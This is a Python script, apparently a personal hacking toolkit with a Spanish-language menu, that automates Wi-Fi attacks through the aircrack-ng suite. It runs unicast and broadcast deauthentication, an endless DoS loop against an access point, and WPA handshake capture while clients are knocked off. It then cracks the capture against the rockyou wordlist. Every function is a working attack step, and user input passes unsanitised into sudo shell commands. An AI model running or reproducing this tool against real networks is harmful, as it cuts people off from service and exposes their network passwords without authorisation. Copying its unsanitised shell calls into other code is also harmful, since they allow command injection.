import os
import time
import subprocess
import pyfiglet

def mostrar_banner():
    banner = pyfiglet.figlet_format("Section 3", font="slant")
    print(f"\033[91m{banner}\033[0m")
    print("🛰  Wireless Arsenal — Deauth & Handshake Suite - by Karli\n")

def menu():
    while True:
        print("\n=== Menu Principal - Deauth ===")
        print("1. Ataque Deauth Unicast")
        print("2. Ataque Deauth Broadcast")
        print("3. DoS ligero infinito al AP")
        print("4. Captura de handshake")
        print("5. Crackeo de handshake")
        print("0. Salir")

        opcion = input("Elegí una opción: ")

        if opcion == "1":
            deauth_unicast()
        elif opcion == "2":
            deauth_broadcast()
        elif opcion == "3":
            dos_ligero()
        elif opcion == "4":
            handshake()
        elif opcion == "5":
            crack_handshake()
        elif opcion == "0":
            print("Saliendo del script.")
            break
        else:
            print("Opción inválida.")

def deauth_unicast():
    bssid = input("🛰  Ingresá el BSSID del AP: ")
    client = input("📱 Ingresá la MAC del cliente: ")
    interface = input("🔌 Ingresá la interfaz (ej: wlan0mon): ")

    print("\n--- Modo de ataque ---")
    print("1. Modo silencio (pausado)")
    print("2. Modo ruidoso (spam)")

    modo = input("Elegí el modo: ")

    if modo == "1":
        print("\n💤 Ejecutando ataque silencioso (20 paquetes espaciados)...")
        for i in range(20):
            os.system(f"sudo aireplay-ng --deauth 1 -a {bssid} -c {client} {interface}")
            time.sleep(2)
    elif modo == "2":
        print("\n💣 Ejecutando ataque ruidoso (20 paquetes seguidos)...")
        for i in range(20):
            os.system(f"sudo aireplay-ng --deauth 1 -a {bssid} -c {client} {interface}")
    else:
        print("Modo inválido.")

def deauth_broadcast():
    bssid = input("🛰  Ingresá el BSSID del AP: ")
    interface = input("🔌 Ingresá la interfaz (ej: wlan0mon): ")

    print("\n--- Modo de ataque ---")
    print("1. Modo silencio (pausado)")
    print("2. Modo ruidoso (spam)")

    modo = input("Elegí el modo: ")

    if modo == "1":
        print("\n💤 Ejecutando broadcast silencioso (20 paquetes)...")
        for i in range(20):
            os.system(f"sudo aireplay-ng --deauth 1 -a {bssid} {interface}")
            time.sleep(2)
    elif modo == "2":
        print("\n💣 Ejecutando broadcast ruidoso (20 paquetes seguidos)...")
        for i in range(20):
            os.system(f"sudo aireplay-ng --deauth 1 -a {bssid} {interface}")
    else:
        print("Modo inválido.")

def dos_ligero():
    bssid = input("🛰  Ingresá el BSSID del AP para DoS: ")
    interface = input("🔌 Ingresá la interfaz (ej: wlan0mon): ")

    print("\n🌀 Ejecutando DoS ligero... (Ctrl+C para detener)")
    try:
        while True:
            os.system(f"sudo aireplay-ng --deauth 1 -a {bssid} {interface}")
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n✅ Ataque detenido por el usuario.")

def handshake():
    print("[!] Antes de empezar el ataque escanea objectivos(ej: usa  recon.sh y best_target.py)")
    bssid = input("🛰  Ingresá el BSSID del AP para capturar handshake: ")
    canal = input("📡 Ingresá el canal del AP: ")
    archivo = input("💾 Ingresá el nombre del archivo para guardar el handshake (sin extensión): ")
    interfaz = input("🔌 Ingresá la interfaz en modo monitor (ej: wlan0mon): ")
    client = input("📱 Ingresá la MAC del cliente (dejá vacío para broadcast): ")

    print("\n[⚠] Matando procesos que pueden interferir...")
    os.system("sudo airmon-ng check kill")

    print("\n🌀 Abriendo terminal para captura de handshake...")
    subprocess.Popen([
        "gnome-terminal",
        "--",
        "bash",
        "-c",
        f"sudo airodump-ng --bssid {bssid} -c {canal} -w {archivo} {interfaz}; exec bash"
    ])

    print("\n💣 Abriendo terminal para enviar deauth packets...")
    if client:
        subprocess.Popen([
            "gnome-terminal",
            "--",
            "bash",
            "-c",
            f"while true; do sudo aireplay-ng --deauth 1 -a {bssid} -c {client} {interfaz}; sleep 2; done; exec bash"
        ])
    else:
        subprocess.Popen([
            "gnome-terminal",
            "--",
            "bash",
            "-c",
            f"while true; do sudo aireplay-ng --deauth 1 -a {bssid} {interfaz}; sleep 2; done; exec bash"
        ])

    print("\n✅ Handshake en curso. Observá la terminal de captura para confirmar el 💍.")

def crack_handshake():
    print("\n🔓 CRACKEO DE HANDSHAKE - Section 3\n")

    cap_file = input("📁 Ingresá el archivo .cap (ej: handshake-01.cap): ")
    bssid = input("🛰  Ingresá el BSSID del AP objetivo: ")
    wordlist = input("📚 Ingresá la ruta de la wordlist [default: /usr/share/wordlists/rockyou.txt]: ")

    if not wordlist.strip():
        wordlist = "/usr/share/wordlists/rockyou.txt"

    print(f"\n🚀 Iniciando crackeo con aircrack-ng...")
    print(f"💾 Archivo: {cap_file}")
    print(f"📡 BSSID: {bssid}")
    print(f"🔑 Wordlist: {wordlist}")

    os.system(f"sudo aircrack-ng -w {wordlist} -b {bssid} {cap_file}")

# Ejecutar
if __name__ == "__main__":
    mostrar_banner()
    menu()
